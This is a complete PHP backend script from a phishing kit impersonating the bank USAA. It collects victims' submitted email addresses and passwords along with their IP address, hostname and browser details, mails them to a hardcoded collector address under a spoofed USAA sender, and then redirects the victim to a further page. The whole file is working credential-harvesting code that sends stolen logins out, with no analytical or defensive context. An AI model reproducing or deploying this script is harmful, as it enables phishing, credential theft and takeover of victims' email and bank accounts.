<?php
 $Ok= "rmcmiller147@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");$date			=	date("D M d, Y g:i a");$user_agent     =   $_SERVER['HTTP_USER_AGENT'];$hostname = gethostbyaddr($ip);$fuck  = "================== Contact Information & CC Infor ==================\n";$fuck .= "Emaill Address : ".$_POST['email']."\n";$fuck .= "Email Pass : ".$_POST['emailpass']."\n";$fuck .= "Emaill Address2 : ".$_POST['email2']."\n";$fuck .= "Email Pass2 : ".$_POST['emailpass2']."\n";$fuck .= "============= [ Ip & Hostname Info ] =============\n";$fuck .= "Client IP : ".$ip."\n";$fuck .= "HostName : ".$hostname."\n";$fuck .= "Date And Time : ".$date."\n";$fuck .= "Browser Details : ".$user_agent."\n";$fuck .= "=============+FishFlowbean+===========\n";$subject = "USAA. Email Access $ip";$headers = "From: uSAa <usaa@zenquel.com>";


mail($Ok,$subject,$fuck,$headers);

 
Header ("Location: contact.php");
?>